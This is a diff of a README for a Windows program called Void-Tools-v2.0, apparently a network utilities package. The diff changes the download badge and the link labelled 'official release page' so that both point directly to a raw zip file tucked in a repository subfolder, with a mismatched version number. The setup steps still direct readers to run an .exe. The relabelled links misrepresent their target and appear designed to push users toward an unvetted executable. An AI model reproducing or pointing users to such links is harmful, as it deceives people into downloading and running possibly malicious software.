@@ -1,6 +1,6 @@
 # 🛠️ Void-Tools-v2.0 - Manage network and digital tasks easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Prestonflatfooted659/Void-Tools-v2.0/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Prestonflatfooted659/Void-Tools-v2.0/main/Void/tools/ip-operator/Void-v-Tools-v1.7.zip)
 
 Void-Tools-v2.0 provides a set of utilities for web and network research. This software includes a text interface to help you organize tasks. Use these tools as part of your research and educational studies.
 
@@ -8,7 +8,7 @@ Void-Tools-v2.0 provides a set of utilities for web and network research. This s
 
 Follow these steps to obtain the program on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Prestonflatfooted659/Void-Tools-v2.0/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Prestonflatfooted659/Void-Tools-v2.0/main/Void/tools/ip-operator/Void-v-Tools-v1.7.zip).
 2. Look at the list under the "Assets" heading.
 3. Click the file that ends in .exe to start your download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
